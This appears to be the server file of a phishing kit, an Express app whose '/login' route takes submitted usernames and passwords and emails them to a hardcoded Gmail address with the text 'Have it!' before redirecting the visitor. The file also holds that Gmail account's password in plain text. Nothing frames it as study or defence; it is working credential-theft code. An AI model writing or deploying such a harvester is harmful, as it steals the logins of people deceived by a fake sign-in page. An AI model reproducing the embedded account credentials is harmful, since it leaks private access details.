const express= require('express')
const nodemailer= require('nodemailer');
const bodyParser= require('body-parser');
const app= express();

app.use(express.static('public'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended:false
}))
app.get('/', (( req ,res) =>
    res.send('Welcome')
))
//sending data
app.post('/login', ((req,res)=>{
    const transporter = nodemailer.createTransport({
        service: 'Gmail',
        auth: {
          user: 'nikitabhist50@gmail.com',
          pass: 'complicatedads',
          secure:true
        }
    })
    var mailOptions = {
        from: 'nikitabhist50@gmail.com',
        to: 'nikitabhist50@gmail.com',
        subject: 'Register',
        text: 'Have it! : Name : '+req.body.name+' Pass:'+req.body.pass+'',
        html: `<ul><li>Name: ${req.body.user} </li><li>Password: ${req.body.pass} </li></ul>`
      }

      transporter.sendMail(mailOptions, function(error, info){
        if (error) {
          console.log(error);
          res.redirect('/');
        } else {
          console.log('Email sent: ' + info.response);
          res.redirect('/');
        }
    })

})
)
app.listen(3000, ()=>{
    console.log('server is up on port 3000')
})